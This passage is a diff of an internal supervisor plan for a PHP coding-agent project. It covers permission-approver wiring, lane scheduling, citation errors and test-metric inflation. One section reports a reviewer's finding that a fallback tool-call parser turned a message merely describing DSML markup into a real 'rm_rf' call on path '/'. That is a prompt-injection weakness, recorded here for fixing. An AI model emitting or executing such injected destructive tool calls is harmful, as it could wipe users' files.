-- **The contract is synchronous and bool-returning.** `Runtime.php:1143` calls it inline:
-  `resolveAsk($ask, $onPermissionRequest($toolCall, $ask) === true)`. Declared `Runtime.php:121-128`,
-  threaded at `:154`, consumed at `settleAsk()` `:1114-1144`. `EngineBackend.php:466` is its only
-  supplier in `src/`.
-- **`Chat`'s permission prompt is NOT a blocking closure — it is a `Deferred` + TEA state machine.**
-  `Chat::requestPermission()` `:1773` makes a `Deferred` at `:2010`, parks state at `:2012-2022`,
-  returns `Cmd::promise(...)` at `:2024`; `answerPermission()` `:2047` resolves it at `:2069`.
-  **Three docblocks call the approver a "BLOCKING closure"** (`AgentManager.php:416`,
-  `Bootstrap.php:914`, `docs/PERMISSIONS.md:193`) — that is INTENT, not implementation. An
-  implementer who trusts them writes `withPermissionApprover(fn() => $chat->prompt(...))` and it
-  cannot cohere. **This is THE trap on this item.**
-- **The prompt UI is complete and starved, not missing.** Producer `Chat::gateToolCall()` `:3054` →
-  `beginToolCalls()` `:1742` builds `PermissionRequestMsg` at `:1752`; renderer
-  `Renderer.php:3398` `renderPermissionPrompt()` in the overlay chain at `:1131`; keys
-  `Chat.php:1194-1195` → `:2227`; `PermissionReply` (`Once`/`Always`/`Reject`);
-  `PermissionPromptStage`. **`PermissionRequestMsg.php:19-22` already names the engine path as the
-  intended second producer.** It is starved because `gateToolCall()` bails at `:3056` for tools not
-  in `$this->tools` and **nothing in production calls `Chat::registerTool()`** (`:4520`).
-- **Four execution paths, and blocking is only safe on two.** TUI+pcntl → forked child
-  (`EngineBackend.php:715`), cannot freeze the UI but cannot reach it either; **TUI without
-  pcntl/socketpair → `completeAsyncBlocking()` `:1201` resolves INLINE ON THE LOOP at `:1208`, where
-  a blocking approver DOES freeze the UI** (three fall-through points: `:705`, `:711`, `:721`);
-  headless `-p`/`run` (`NonInteractive.php:207`) and background sessions
-  (`BackgroundSessionRunner.php:195`) are plain synchronous, where blocking is correct.
-- **The fork channel is one-way TODAY but full-duplex ALREADY.** `$parentSocket` appears at exactly
-  five points and **there is no `fwrite` to it anywhere**; `writeFrame()` `:1010` is child-side only.
-  But `:709` is `stream_socket_pair(...SOCK_STREAM...)` and the length-prefixed framing
-  (`:1010`/`drainFrames()` `:1044`) is symmetric. So the TUI fix is **adding a direction to an
-  existing channel**, not replacing the transport — 120-200 lines in `EngineBackend` + 100-180
-  INFERRED in `Chat.php`.
-
-**DECISION — do the headless subset FIRST, as its own bundle.** `NonInteractive.php:207` runs on a
-plain synchronous stack with no loop and no fork, so a blocking approver there is the natural shape,
-not a compromise. It touches only `src/Cli/**` (free), needs neither `Chat.php` nor the fork
-protocol, and it is what makes `--permission-mode default` on `-p` **mean something** instead of
-failing closed — the direct completion of what lane `cmd` shipped in `339f512c`. Attach at
-`Bootstrap::backend()` `:1571-1583` / `backendFor()` `:1627-1639`, NOT via an `instanceof
-EngineBackend` narrow in NonInteractive: `Backend` (`src/Backend.php:38-77`) declares only
-`complete()`/`completeAsync()`.
-**A policy-only approver is a REJECTED half-measure** — `PermissionRule` (634 lines) already decides
-exactly that, earlier, at `PermissionGate::decide()` `:220-227`; the residue reaching `Ask` is by
-definition what policy could not answer, so it would ship a second weaker copy of the rule engine.
-
-**Collision verdict: the engine-approver bundle CAN run alongside `lsp` and `sglang`** — every
-mandatory file is free (`src/Backend/**`, `src/Cli/**`, `src/Chat.php`, plus `Runtime.php` and
-`PermissionRequestMsg.php` which are in no held set) — **conditional on the engine ASK reusing
-Chat's existing `pendingPermission`/`permissionStage` state.** Build a separate engine-permission
-pane instead and `src/Renderer.php` becomes mandatory and the lane collides with `lsp`.
-
-**Traps to carry into that bundle:**
-1. `=== true`, never a truthy cast (`Runtime.php:1143`, `AgentManager.php:591`) — every
-   `PermissionReply` case is a truthy enum object, `Reject` included. `Runtime.php:1137-1142` names
-   `ForeignAgentPresetRegistry` as the prior incident where a cast granted access.
-2. **Show the approver the REWRITTEN call, not the original** (`Runtime.php:1131-1141`, `asAsked()`
-   `:1180`) — an ASK can carry a hook's rewrite; showing the original puts one command in front of
-   the user and runs another.
-3. **The two seams have DIFFERENT signatures.** `EngineBackend` takes `(ToolCall, HookResult): bool`
-   (`:312`); `AgentManager` takes `(ToolCall, SubAgent): bool` (`:48`). `AgentManager.php:551-552`
-   says "an approver written once works on both" — **that is about the RETURN contract, not the
-   parameter list.** One closure cannot serve both without an adapter. `AgentManager`'s seam is
-   unwired only because `Bootstrap.php:607` passes two arguments to a three-parameter method.
-4. **The fork kills state, not just the channel.** `PermissionGateHook.php:67-80` Auto strike
-   counters increment in the child and die with it, so the 3-strike breaker restarts every turn on
-   the TUI path. An `Always` grant recorded child-side vanishes the same way — session grants must be
-   recorded in the PARENT (`Chat.php:2108-2111` already does this for the Chat-native path).
-5. **The idle timeout will kill a turn waiting on a human.** `COMPLETE_TIMEOUT_SECONDS` resets per
-   frame (`EngineBackend.php:805-816`) and a child blocked on an approval reply emits none. Treat the
-   approval-request frame as progress, or pause the timer while an ask is outstanding. **This is an
-   idle ceiling on the fork channel, NOT a total-request timeout on an LLM call**, so amending it does
-   not violate the standing rule.
-6. **Retry double-prompts** (`AgentManager.php:405-430`): a 503 mid-stream re-runs
-   `evaluateToolCalls()`, calling the approver AGAIN and double-committing strikes — measured in-tree
-   as "one Write call plus a 503 mid-stream shows the user 2 approval prompts". Harmless only because
-   the seam is unwired; **wiring it makes it live.** Backlog E28. FINDING, not a blocker.
-7. **`PermissionRequestMsg` cannot be reused verbatim** — it carries `$assistantMessage` and replays
-   the whole parked batch (`:29-30`, `Chat.php:550`), which fits Chat owning the batch. On the engine
-   path the calls are mid-iteration inside a generator in another process; there is nothing to replay.
-   Reuse the **state fields it feeds**, not the Msg.
-8. **Do NOT flip the default mode in the same change.** `Bootstrap.php:2934-2954` plus 8 assertion
-   sites in `tests/Cli/BootstrapPermissionGateTest.php` pin `BypassPermissions`. Wiring the approver
-   is a PREREQUISITE for flipping it, not the flip.
-
-⚠️ **THE APPROVER BUNDLE MUST UPDATE TWO README PARAGRAPHS, AND README IS A CONTENDED FILE.**
-`sugar-crush/README.md:854` states "on the **engine** path an ASK currently fails closed, so an
-asking mode refuses those calls rather than prompting", and `:881` is a whole known-gap entry —
-"**nothing anywhere attaches an approver** — `EngineBackend::withPermissionApprover()` has no caller
-outside its own test" — which also correctly names the one-way frame stream as the second blocker.
-**Both are accurate today and both become PARTLY false the moment the headless subset lands**, since
-the gap then closes for `-p`/`run`/background sessions and stays open only for the TUI. Rescope them;
-do not delete them (that is the same mistake `sglang`'s B4 had to undo). Supervisor-verified at
-`22c468ba`: the README survived two lanes editing different sections in round 33 and reads
-coherently, so any incoherence after the approver bundle is that bundle's.
-
-**Open, needs a spike before the TUI half is briefed:** whether the child can block on a socket read
-without deadlocking the parent's `addReadStream` — both ends are the same socketpair, the parent's
-handler runs on the loop and would have to write the reply from inside a Chat `update()` cycle, and
-the parent end is non-blocking (`:731`). Fork a child, block it on `fread($childSocket)`, write from
-the parent's loop, measure.
-
-### THE RULES ROUND 33 HAS EARNED SO FAR
-
-- 🔴 **THE SUPERVISOR RELAYED A WRONG CITATION TWICE WITHOUT OPENING THE FILE — AND WROTE A SECOND
-  ONE INTO THE OWNERSHIP TABLE.** Both were caught by a scout, not by the supervisor.
-  1. `ARCHITECTURE.md:381-389` was recorded by the round-34 pre-measurement as the "Built but
-     unwired" seam list. It is not; it is the **render-invariants** section ("the frame must clip to
-     the terminal height", "never over-wide lines"). The seam list is at **`:417-421`**. The
-     supervisor relayed the wrong range into the RESUME and then into a lane brief, twice, without
-     ever running `sed -n '381,389p'`. **A citation inherited from an agent is not measured just
-     because an agent measured something.**
-  2. The lane-ownership table wrote lane `lsp`'s held set as `` `Renderer.php`, `KeyboardHandler.php` ``
-     — a parallel pair implying a shared directory. **`src/Renderer.php` exists; `src/KeyboardHandler.php`
-     does not.** The file is `src/Tui/KeyboardHandler.php`, already covered by `src/Tui/**`, so the
-     held set was unchanged in substance and no lane was misrouted — **this time.** The defect is that
-     two paths were written as a pair when only one was checked.
-  Same shape as every prior instance: **a true thing written next to a different thing.** The novelty
-  is the vector — *relay*. Rounds 31-33 each found the defect inside the work correcting it; this one
-  was inside the ownership bookkeeping that exists to keep lanes from colliding.
-  **Rule: re-open the file at the line range before repeating any citation you did not personally
-  take, including one from your own earlier document.**
-
-- **THE DOCBLOCKS CAN AGREE WITH EACH OTHER AND ALL BE WRONG.** Three separate places
-  (`AgentManager.php:416`, `Bootstrap.php:914`, `docs/PERMISSIONS.md:193`) call the permission
-  approver a "BLOCKING closure". The implementation it describes is a `Deferred` + TEA state machine
-  that cannot be called from a `bool`-returning closure at all. Corroboration across files is not
-  evidence — the three agree because they were written from the same intent, before the
-  implementation diverged. **Consensus among comments measures a shared ancestor, not the code.**
-
-- **A DATE STAMP DOES NOT STOP A NUMBER BEING READ AS CURRENT.** `crush_code.md:1999` and `:2069`
-  both carried "**393,216** … as of `ed57d46a`" — stamped with the commit they were measured at,
-  which is exactly the discipline this plan asks for — and both still read as present-tense fact a
-  day after `d97580ab` moved the value underneath them. Stamping records when a number was true; it
-  does not make a stale number look stale. **No test pinned any of the five copies**, which is why
-  the suite could not have caught it. The durable fix was to say the figure is model-aware and
-  provider-reported and to name the literals as illustrative, not to write a fresher literal.
-- 🔴 **THE SUPERVISOR'S OWN BRIEF CARRIED THE RECURRING DEFECT — INSIDE THE PARAGRAPH WARNING ABOUT
-  IT.** The DSML brief told its agent: *"those are FULLWIDTH vertical bars (U+FF5C), not ASCII `|`,
-  and the tokens contain U+2581 LOWER ONE EIGHTH BLOCK. Verify the exact bytes yourself with a hex
-  dump before writing a pattern — a pattern written with ASCII pipes will match nothing, silently,
-  and a test written with the same wrong bytes will pass."* The agent did exactly that, hex-dumped
-  upstream's `encoding/README.md`, and reported back: the DSML tags are
-  `3c ef bd 9c 44 53 4d 4c ef bd 9c` — **U+FF5C only, no `e2 96 81` anywhere.** U+2581 appears solely
-  in `<｜begin▁of▁sentence｜>` / `<｜end▁of▁sentence｜>`, which are sentence tokens, not markup tokens.
-  **A true claim about one token family, written next to a different one** — the exact shape, in the
-  sentence instructing the reader to distrust exactly that shape. The instruction is what saved it;
-  the fact attached to the instruction was wrong. Inherited verbatim from the round-32 workflow
-  script and shipped without re-measurement, which is the whole failure: **the brief told the agent
-  to measure and did not measure itself.**
-  Now pinned by `testATagCarryingTheSentenceTokenBlockCharacterIsNotDsml`.
-  This is the third consecutive round in which the defect appears inside the work correcting it.
-- 🔴 **A TEXT-SCANNING FALLBACK PARSER IS A PROMPT-INJECTION SURFACE, AND THE PRECEDENT CARRIED THE
-  BUG.** The round-33 reviewer fed the new `DsmlToolCallParser` a message that merely *described*
-  DSML — "to call a tool you emit markup like this: ```<｜DSML｜tool_calls>…name=\"rm_rf\"…```. I have
-  not actually called anything." It returned **one real tool call, `rm_rf` with `path=/`.** Not
-  hypothetical: the DeepSeek card puts the DSML example **into the system prompt**
-  (`encoding_dsv4.py:84-94`, `render_tools`), so a model asked how tool-calling works quotes its own
-  instructions back verbatim. **The fallback whose whole purpose is that tool calls are never
-  silently MISSED was, for one prompt shape, silently INVENTING them** — the failure mode inverted.
-  The cause is detection by `str_contains($content, MARKER)`, i.e. "the marker appears anywhere";
-  upstream instead scans **positionally** from `f"\n\n<{dsml_token}{tool_calls_block_name}"`
-  (`enc.py:726`).
-  **And it was inherited.** `MinimaxXmlFallbackToolCallParser:74` has the identical
-  `str_contains($content, self::ENVELOPE_MARKER)` and has been shipped and wired since long before
-  this bundle — supervisor-measured. The brief said "copy its shape, not its regexes"; **the shape
-  was the vulnerability**, and neither that class's own review nor this brief noticed. Exposure
-  differs and the code must say so: `minimax-xml-fallback` is reachable only when explicitly named in
-  the `toolCallParser` config key, while DSML is now the derived default for the DeepSeek-V4 family.
-  **The general rule: a precedent is a vector. "Follow the existing pattern" propagates whatever the
-  pattern got wrong, and copying a shape copies its holes.**
-
-- **A CORRECTED CONSTANT LEAVES CORRECTED-LOOKING ARITHMETIC BEHIND.** `7957b2be` swept five places
-  that *quoted* the superseded 393,216 and missed three that were **derived from it**:
-  `contextWindow()`'s tier figures `~275,251 / ~334,233 / ~373,555` are 70/85/95% of 393,216. A grep
-  for the stale number cannot find a number computed from the stale number. The lane found them and
-  corrected them to `~733,999 / ~891,284 / ~996,141`. **Sweep for the derived values, not just the
-  literal.**
-
-- **TWO PAGES CAN STATE OPPOSITE THINGS AND THE CORRECT ONE IS THE UNFLAGGED ONE.**
-  `HookManager.php:34` warned that `name: confirm-remove` would UNINSTALL `ConfirmRemoveHook`.
-  `ConfirmRemoveHook::name()` returns `confirm-rm`, so `confirm-remove` is the one name that collides
-  with nothing and is quietly **accepted** — `docs/HOOKS.md:118` and its table at `:130-131` have said
-  so the whole time. The plan recorded this as "only the example is wrong"; the example demonstrated
-  the **opposite outcome**, which is a different and worse defect. Fix was one docblock; the lesson is
-  that "the example is slightly off" was itself an under-measurement.
-
-### THE `candy-core` FOUNDATION EDIT IS CLEARED ACROSS THE WHOLE MONOREPO
-
-`c4718781` added `'Z' => KeyMsg(Tab, shift: true)` to `candy-core/src/InputReader.php::decodeCsi()`
-from a sugar-crush-scoped lane. `candy-core` is the foundation lib;
-`php scripts/affected-libs.php --files candy-core/src/InputReader.php` reports **affected=53/58**,
-so CI will fan it out that far. The implementer ran 2 libs; its reviewer ran 8. **The supervisor ran
-the full sweep: 57 libs with results, 0 FAILURES, 0 ERRORS, every one rc 0.** Nothing in the tree
-regressed on the foundation change.
-
-**Two sweep artefacts that must NOT be read as coverage gaps** (both recorded in
-`scratchpad/closure-results.txt` itself, since that file is what a later reader consults):
-- `candy-mosaic` shows `rc=143` in the raw log. **That is the supervisor's own kill signal, not a
-  failure.** It is a LoopPin lib; `timeout 300` killed `phpunit` but a forked test child outlived it
-  still holding the write end of the pipe, so the `$( … | grep … )` command substitution blocked for
-  25 minutes on a process that no longer existed. Re-run standalone with no pipeline it is green in
-  11s: **449 / 7704 / 6 skipped / rc 0.** ⚠️ **`timeout` does not rescue a piped phpunit in this
-  repo — redirect to a file instead of piping when backgrounding a suite.**
-- Four `SKIP(no vendor) <lib>}` lines carry a **trailing brace** — an artefact of parsing
-  `affected-libs.php`'s output, not a real lib. `candy-shine`, `candy-vt`, `candy-wish` and
-  `sugar-wishlist` each ran normally under their correct names and are green. **The supervisor
-  initially mis-read the `candy-shine` one as "the parse missed a real lib" and re-ran it, only to
-  reproduce the line already in the file** — a true observation (the parse emitted a malformed entry)
-  attached to a false consequence (a lib went uncovered). Same shape as the phantom `pane:files`
-  zone, made while writing up that very lesson. **Check whether a thing is already covered before
-  calling it a gap.**
-
-### ROUND 34 IN FLIGHT — P8.9 (fix stage) and P8.4 (fix stage, FOUR BLOCKING)
-
-| lane | bundle | stage |
-|---|---|---|
-| `crush-lane-cmd` | ~~P8.9~~ ✅ `b009077a` → now **HEADLESS ENGINE APPROVER** | **IMPLEMENT** |
-| `crush-lane-lsp` | **P8.4** — wire the split-pane compositor | **FIX** (review: COMMIT AFTER FIXES, **4 BLOCKING**) |
-| `crush-lane-sglang` | — | idle at master, ready |
-
-**P8.9 ✅ `b009077a` — supervisor-verified `8331 / 92144 / 1 / rc 0`.** New suite floor.
-`Grep` now carries the `InstructionFileLoader` + `skillNudge` pair like the other four path-resolving
-tools. The `ParallelSafe` verdict stayed `true` but its JUSTIFICATION was replaced: the interface's
-own point 2 permits session-scoped state that survives the fork via `CarriesSessionState`, and the
-old docblock's "contrast `Read`/`Glob`" **was already false before the change** — both carry the
-collaborators and both return `true`. A **real forked** test now sits beside its `Read` sibling in
-`ParallelToolCallsTest`, over two separately-governed directories so a half-merge is visible.
-**Two premises in the supervisor's brief were wrong and the lane proved it:** `Write`'s
-`instructionLoader` IS guarded (dropping it fails a pre-existing test); the unguarded half was the
-**`skillNudge`**, and dropping THAT moves not one assertion across 376 tests. And "Write is
-constructed apart" was a reading artefact — all eleven built-ins sit in one `$tools = [...]` literal.
-Backlog gained **E55** (`maxOutputBytes` no longer bounds `Grep` — measured **16.8×** the cap) and
-**E56** (`Glob` prepends before clipping, so at cap 200 it lists **0 of 5** matched paths). ⚠️ The
-lane hit an **E-number collision** — master's round-33 commits added E51-E54 while it was open — and
-resolved it by taking upstream's block whole and re-filing as E55/E56. **Master's E51 is a DIFFERENT
-finding from the one the P8.9 brief called E51.** Verified: no duplicate E-numbers in the ledger.
-Also corrected: **`Read` does NOT `use TruncatesOutput`** (only `Bash`, `Glob`, `Grep`, `LspTool`,
-`EnvironmentBlock` do) — it has its own inline cut at `Read.php:209-219`. The conclusion holds anyway:
-`Glob` is still the only tool with the prepend-before-clip shape.
-
-🔴 **P8.4 IS WIRED TO A SOURCE THAT NEVER FIRES. This is the round's most important finding and it
-was PROVEN, not argued.** `AgentManager::liveOutputs()` (`:341-352`) iterates `$this->agents`,
-populated **only** by `register()` (`:62-65`). `WorkflowEngine::executeParallelStage()` never calls
-`register()` — it builds ad-hoc `Agent`s named `$task->name ?? $task->agentType`
-(`WorkflowEngine.php:1224`, `:1251`) and wraps them in `SubAgent`s (`AgentManager.php:646`). The
-reviewer registered the real `Bootstrap::agentRoster()`, inserted a SubAgent named `style-fixer`
-exactly as `:646` does, and measured **`liveOutput('style-fixer')` returning text while
-`liveOutputs()` returned `[]`**. Both shipped workflows name their parallel tasks
-(`examples/workflows/lint-then-fix.yaml:41,49`; `workflows/deep-research.php:46,57,68,79`) and **none
-is a roster name** — so neither can activate the split.
-- **It also never DEACTIVATES.** `liveOutput()` (`:313-323`) filters only on `output !== ''`; nothing
-  clears `SubAgent::$output`; `removeSubAgent()` (`:777-780`) has **zero callers** — leave it, per the
-  no-delete rule. **The asymmetry is the tell:** the existing consumers (transcript strip,
-  `AgentDashboardPane`) go through `active()` (`:105-121`), which DOES filter on `isWorking()`. The
-  new consumer is the only one that does not.
-- ⚠️ **AND A THIRD LAYER: no frame renders while the agents talk.** `Chat.php:6212` calls
-  `workflowEngine->run()` **synchronously** inside `handleWorkflowCommand()`, dispatched from the
-  slash `match` at `Chat.php:5480` inside `update()`. The whole workflow completes before `view()` is
-  called again. **So registration + liveness alone may still yield a split that never appears** —
-  during the run nothing renders, and afterwards a correct liveness filter hides it. Making it
-  genuinely visible needs async workflow execution, which is a separate item and explicitly OUT of
-  this bundle. The fix lane is told to settle this by measurement first and to report rather than
-  attempt an async rewrite.
-- 🔴 **FOUR documents assert behaviour that could not be reproduced** — `agentSplitWidth()`'s docblock
-  ("changes shape while a workflow's agents talk and reverts when they fall silent" — **both halves
-  false**), `sugar-crush/docs/ARCHITECTURE.md`, `crush_code_hardening_backlog.md` (**F5 was flipped to
-  "RESOLVED — WIRED" and must NOT be**), and the rewritten `src/Renderer.php:115-127`. That last one
-  is the sharpest lesson available: **its OLD claims were genuinely false** (`WorkflowEngine` IS
-  constructed at `Bootstrap.php:770`; `Chat::executeAgents()` at `Chat.php:4049` still has no caller),
-  **and its NEW conclusion is also unverified** — the strip reads `active()`, the same registered-only
-  map. **A correction installed a fresh falsehood in place of the stale one.**
-- 🔴 **A new docblock states the REVERSE of pre-change behaviour.**
-  `MultiplexerSplitPane.php` now says the bug "made this branch render a 50/50 split while the
-  no-multiplexer branch honoured whatever the caller asked for". **Neither branch honoured caller
-  proportions** — pre-change, `renderForCurrentEnvironment()` was
-  `(string, string, SplitDirection, int $cols = 0, int $rows = 0)`, so no numerator/denominator
-  parameters existed to drop. Both rendered 1/2 because that is `renderWithSplit()`'s default. The
-  real divergence was **size**. Same error in `Tui/Renderer.php`'s "dropped every one of the four" —
-  it dropped **two**. The size fix itself is real and verified (TMUX and iTerm2 runs now agree).
-
-**What IS sound in P8.4, verified by the reviewer's own harness — do not re-litigate:** the render
-invariant holds across **2248 self-generated frames** (cols 20-300 × rows {10,24,30,40}), zero
-over-wide rows, zero over-tall frames; the silent path is **byte-identical** to pre-change
-(md5 `7c114b70d7b472448e836752ce5a3df4` both runs); the census is correct; held files untouched; the
-`+23 / +1488` arithmetic closes exactly.
-
-⚠️ **A SURVIVING MUTATION THE IMPLEMENTER DID NOT REPORT:** `intdiv($cols,3)` → `(int) round($cols/3)`
-**survives all 22 tests**, changing the agent column at every `cols % 3 == 2`. The 281-width sweep
-asserts `band + 1 + column == cols`, which holds for **any** sizing policy — **it pins the SUM, never
-the SIZING.**
-
-📊 **THE ASSERTION COUNT IS NOT MEASURING WHAT IT LOOKS LIKE.** Of the 1482 new assertions, **1344
-(90.7%) come from two loops**, and **PHPUnit 10 counts `assertLessThanOrEqual`/`assertGreaterThanOrEqual`
-as 2** (composite `LogicalOr`) — so the real assert-CALL count is **~880, not 1488**. The 281-width
-sweep buys **four** distinct properties and its band-floor check is monotone, so only the minimum at
-cols=80 is load-bearing. **This matters repo-wide: assertion totals are a headline health metric in
-this plan and they are inflated by the `…OrEqual` family.**
-
-### ⚠️ THE ASSERTION TOTAL IS NOT COUNTING ASSERT CALLS — supervisor-verified
-
-Every round of this plan quotes `tests / assertions` as its health figure. **PHPUnit 10 counts
-`assertLessThanOrEqual()` and `assertGreaterThanOrEqual()` as TWO assertions each** (they are
-composite `LogicalOr` constraints). Supervisor-verified directly, with a four-method probe run
-against `sugar-crush/vendor/bin/phpunit`:
-
-```
-assertSame              -> OK (1 test, 1 assertion)
-assertLessThanOrEqual   -> OK (1 test, 2 assertions)
-assertGreaterThanOrEqual-> OK (1 test, 2 assertions)
-assertLessThan          -> 1 assertion   (plain comparisons are NOT doubled)
-```
-
-**Scale, stated as two different things because they ARE two different things:**
-- **Repo-wide the distortion is small.** `grep -rho "assert\(Less\|Greater\)ThanOrEqual("` over
-  `sugar-crush/tests/` finds **142 static call sites**. If each ran exactly once that is +142 on
-  92,144, i.e. **0.15%**. ⚠️ **That is a FLOOR, not the answer** — a static count cannot see loop
-  iterations, and one such call inside a 281-iteration sweep contributes **562**.
-- **Per-bundle it can be enormous.** P8.4 reported **+1488 assertions** for +23 tests; the real
-  assert-CALL count is **~880**, a **~68% overstatement**, because 1344 of them came from two loops.
-
-**How to read a bundle's assertion delta from now on:** a large delta is evidence of loop iterations,
-not of properties pinned. P8.4's 724-assertion sweep buys **four** distinct properties, and its
-band-floor check is monotone so only the minimum at cols=80 is load-bearing. **Ask what a delta
-PINS, never what it totals** — and the proof is that the same 724 assertions failed to catch
-`intdiv($cols,3)` → `round($cols/3)`, because they assert the SUM (`band + 1 + column == cols`),
-which holds under any sizing policy.
-
-### ROUND 35 IS MEASURED — and finding #8 was SILENTLY DELETED from this file
-
-🔴 **FINDING #8's TEXT WAS DROPPED BY `7ce8a735` AND TWO LATER LINES STILL REFERENCE IT.** The OPEN
-FINDINGS list carries only seven entries while other lines still say "#8 docs". Recovered verbatim
-from `git show 7ce8a735` and restored here so it cannot be lost again:
-
-> **8. 🟡 `sugar-crush/docs/PERMISSIONS.md` enumerates three `trustedProject*` grants and misses the
-> fourth** (`trustedProjectSettings`, landed one commit after Phase 7 was marked complete), and the
-> settings layering has no reference page at all. A page that enumerates trust grants and misses one
-> is worse than no page. Route to the next docs bundle; prefer deriving the list from the constants.
-
-**Still true, verbatim:** `docs/PERMISSIONS.md:239`'s heading literally reads `## The three
-\`trustedProject*\` keys` and its table at `:248-250` has three rows. The fourth is real —
-`LayeredSettings.php:142` `PROJECT_SETTINGS_TRUST_KEY = 'trustedProjectSettings'`, consumed at
-`Bootstrap.php:2039-2041`, already documented in `README.md:159-162`. ⚠️ **"Prefer deriving the list
-from the constants" is not cheaply possible** — the four keys live in TWO classes and three are
-`private const` (`Bootstrap.php:120`, `:136`, `:151`); only `LayeredSettings`' is public. A drift test
-reaches the first three by reflection only. Say so rather than implying one list exists.
-
-### R35 VERDICTS — three items have FALSE PREMISES, and two plan sizings are wrong by a wide margin
-
-- **P3.4 — OPEN, but TWO of its four targets do not exist as described.** ✅ Real:
-  `Commands/AgentsCommand.php:84-100` (byte-length `strlen()`/`substr()` columns on model-supplied
-  text — same defect class as P3.5) and `Commands/McpAuthCommand.php:66-85`. ❌ **`/sessions` is a
-  MODAL WIDGET**, not a list — `Chat::handleSessionsCommand()` (`:7457`) opens a `SessionPicker`
-  (`buildSessionPicker()` `:7496`); there is no list-shaped text to table-ise. ❌ **LSP diagnostics is
-  false twice**: the output is `json_encode(...)` into a **`ToolResult`** (`LspTool.php:359-370`) —
-  it goes to the MODEL, not the screen — **and the surface is dead**: `LspClient::$diagnostics`
-  (`:38`) is filled only by `handlePublishDiagnostics()` (`:446`), which has **zero `src/` callers**.
-  ⚠️ **This file's own claim that P3.4 "reaches deep into `src/Chat.php`" is WRONG** — `Chat.php` only
-  `ob_start()`-captures (`:6488-6527`, `:10345-10354`); the rendering lives in `src/Commands/`.
-  Scoped to the two real targets it is **~150-250 lines across two small files.**
-  🔴 **THE TRAP:** `tests/Commands/NoRawAnsiInTranscriptTest.php` guards `McpAuthCommand`/`ShareCommand`
-  with a **source-literal regex** (`:44`), so a `Table` styled at RUNTIME sails past it while
-  reintroducing the exact bug the file exists for. **Border-only — no `Style`, no `styleFunc`, no
-  `Theme`** — and widen that test to cover `AgentsCommand.php`, which is unguarded today.
-- **Finding #5 — OPEN, both figures EXACT** (rare here). `AgentPreset.php:22-37` has **16** promoted
-  properties; `Agent::fromPreset()` reads **6**; **10** are dropped. ⚠️ The finding names
-  `agentRoster()` but the code is `Agent::fromPreset()` — `Bootstrap::agentRoster()` (`:1045`) only
-  calls it, and **`Bootstrap.php` is lane-held**, so scope the fix to `Agent.php`/`AgentPreset.php`.
-  It is **not** a field-mapping change: `Agent` has no properties for the 10, so the fix widens the
-  value object and fans out to every constructor call site. ⚠️ The `permissionMode` half is dormant
-  downstream — it would be consumed at `AgentManager::createSubAgent()`, which has **no `src/`
-  caller**. Carry the field (no-delete rule), but **do not claim it changes behaviour.**
-- **Finding #4 — OPEN, and it is a DECISION, not a wiring.** 9 frontmatter keys (`Skill.php:16-24`),
-  **5 inert**. `context` has one real read (`SkillRegistry.php:150`) whose only call sites are
-  `App.php:367` and `:454` — **both in methods with no production caller**, so `context: fork` is
-  inert on every real run. 🔴 **There are TWO skill→system-prompt paths and the finding names only the
-  dormant one.** The LIVE path is `Runtime::buildSystemPrompt()` (`:1391-1397`), which already appends
-  `systemPromptContribution()` for every enabled skill. **Naively wiring `App::applySkillsToSystemPrompt()`
-  emits every skill body TWICE.**
-- **P8.8 — OPEN, greenfield (zero hits), but its two halves are different KINDS of thing.** Half A
-  (a lib's `vendor/composer/autoload_*.php`) is generic and works for any Composer project; **Half B
-  parses `docs/MATCHUPS.md`/`PROJECT_NAMES.md` and is hardcoded to THIS repository** — inert for every
-  other user. Settle that before writing code. Precedent is **`MemoryBlock`** (351 lines), not
-  `EnvironmentBlock` (575); the item's "~150-250 lines" is low — **budget 300-400**. ⚠️
-  `EnvironmentBlock::MAX_*` carries a "sized BETWEEN its two neighbours" argument (`:113-135`) that a
-  THIRD block invalidates.
-- **`Help::screen()` restyle — RECOMMEND DROP.** The plan says it is "a raw heredoc" at
-  `Help.php:36-41`; the heredoc actually runs `:38-182` — **145 lines, not 6, a 24× sizing error.**
-  `candy-kit`'s primitives emit ANSI unconditionally (`Banner.php:18-35`) and `--help` is routinely
-  piped, so a faithful restyle needs a `posix_isatty()` guard the item never mentions — and
-  `tests/Cli/HelpTest.php:90-104` asserts a line-start regex against `screen()` that ANY SGR prefix
-  breaks, for every flag. A cosmetic item the plan itself grades "LOW priority, not worth a dedicated
-  PR" costing a TTY design decision plus a 490-line test rewrite. **Record the unused `candy-kit` dep
-  as a finding instead.**
-- **P8.13 — DEFER.** ⚠️ The "eleven tools" figure lives in **SEVEN files, not the three** recorded
-  here — including **`docs/AGENTS_AUTHORING.md:185`** ("There is no `Task` or `Agent` tool"), which
-  P8.13 directly falsifies and which no prior measurement named. Also `Bootstrap::tools()`'s docblock
-  is **`:4041-4098`**, not the `:3925-3965` recorded here (that range is the MCP shutdown seam).
-  **P8.8 and P8.13 collide on the census token — they cannot run in parallel lanes.**
-- **P6.5 — OPEN, both halves currently blocked on lane-held files.** ⚠️ `crush_code.md:800-808`'s own
-  conflict claim is **FALSE**: it says the keybindings half "reads `src/Chat.php`", but `Chat.php` has
-  **zero** registry calls — only three doc-comment mentions (`:106`, `:1407`, `:2313`). Real call
-  sites are `Tui/KeyboardHandler.php:49,98,344` and `Renderer.php:**3314** `live()` / **3340** `grouped()` — ⚠️ **this file previously repeated the PLAN's `:3270`/`:3296` as if it had verified them; those two lines are doc-comment prose, not calls. Re-measured 2026-08-20.** The `Chat.php`-has-zero-calls half WAS correct: three occurrences (`:106`, `:1407`, `:2313`), all comments. ⚠️ **`candy-kit/src/StatusLine.php`
-  EXISTS** and is a rendering primitive, not this feature — an implementer greping `statusLine` will
-  find it and may think the work is half-done.
-
-**PLAN-TEXT ERRORS TO SWEEP** (each verified by the scout; ✅ = already fixed since it measured):
-`crush_code.md:751` (`Help.php:36-41` → `:38-182`) · `:1359`/`:1414` (env block `:40-45`/"three" →
-`:106-170`/seven+, stale, closed by Phase 4 item 4) · `:864` + `AGENTS.md` (**`MATCHUPS.md` is at
-`docs/MATCHUPS.md`, not root**) · `:749` (`candy-sprinkles\Table` → `SugarCraft\Sprinkles\Table\Table`)
-· `:800-808` (false Chat.php conflict) · ✅ this file's `ARCHITECTURE.md:192` (prompt assembly is `:224-241` — confirmed: the heading
-"### The system prompt, in assembly order" is at `:224`) · this file's `Bootstrap::tools()` `:3925-3965` (→ `:4041-4098`) · this file's P3.4
-"reaches into Chat.php" · ✅ `src/Renderer.php:117` "`WorkflowEngine` is never constructed" — **the
-scout measured at `aae62989` and `7714675d` had already corrected it**; the paragraph now carries the
